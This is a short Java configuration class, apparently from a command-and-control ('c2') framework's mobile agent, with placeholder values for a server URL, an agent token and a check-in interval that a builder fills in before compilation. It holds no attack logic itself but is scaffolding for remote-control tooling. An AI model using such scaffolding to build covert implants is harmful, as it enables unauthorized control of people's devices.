package com.wym.c2;

/**
 * Build-time configuration, injected by the server's mobile builder
 * (placeholders are replaced before compilation).
 */
public final class Config {
    public static final String SERVER_URL = "@@SERVER@@";
    public static final String AGENT_TOKEN = "@@TOKEN@@";
    public static final int INTERVAL_SECONDS = @@INTERVAL@@;
    private Config() {}
}